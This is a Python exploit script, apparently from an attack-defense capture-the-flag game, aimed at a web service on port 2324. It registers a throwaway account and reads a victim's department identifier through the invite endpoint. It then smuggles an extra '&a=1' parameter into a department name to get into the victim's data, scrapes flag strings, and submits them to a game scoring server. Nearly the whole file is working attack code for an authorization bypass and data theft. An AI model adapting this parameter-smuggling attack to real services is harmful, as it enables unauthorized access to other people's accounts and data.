import requests
from requests import session
import faker
from bs4 import BeautifulSoup
import re
import json
import sys
import time

regex = re.compile('[A-Z0-9]{31}=')

url = f"http://{sys.argv[1]}:2324"
victim = "jopa"

def attack_data():
    return (json.loads(d) for d in requests.get('http://10.10.10.10/api/client/attack_data/').json().get('archiveSCP', {}).get(sys.argv[1], []))

def send(flag):
    print(requests.put('http://10.10.10.10/flags', headers={'X-Team-Token': '???'}, json=flag).text)

def signup(session: requests.Session, username: str, password: str):
        resp = session.post(f'{url}/register', data={
            'username': username,
            'password': password,
        })
        return session

def signin(session, username, password):
     resp = session.post(f'{url}/login', data={
            'username': username,
            'password': password,
        })
     return session

def get_list_scp(session):
    resp = session.get(f"{url}/")
    soup = BeautifulSoup(resp.text, 'html.parser')
    content_div = soup.find('div', id='content')
    links = content_div.find_all('a')
    return links

def get_flag_from_scp(session, links):
    for link in links:
        resp = session.get(url + link["href"])
        return regex.findall(resp.text)[0]
    

def createDepartment(session: requests.Session, name: str):
    resp = session.post(f'{url}/create_department', data={"name_department":name})
    return name

def getDepartment(session, name):
    resp = session.post(f"{url}/invite", data={"username": name})
    soup = BeautifulSoup(resp.text, 'html.parser')
    tag_html = soup.find_all('p')[-1]
    return tag_html.text.split()[-1]


def get_password(name):
    resp = session.post(f"{url}/invite", data={"username": name})
    soup = BeautifulSoup(resp.text, 'html.parser')
    tag_html = soup.find_all('html')[-1]
    text_after_html_tag = ''.join(tag_html.find_next_siblings(string=True))
    return text_after_html_tag

flags = []

session = requests.session()
session = signup(session, faker.Faker().name(), faker.Faker().password())
createDepartment(session, faker.Faker().name())
createDepartment(session, getDepartment(session, victim)+"&a=1")
send(get_flag_from_scp(session, get_list_scp(session)))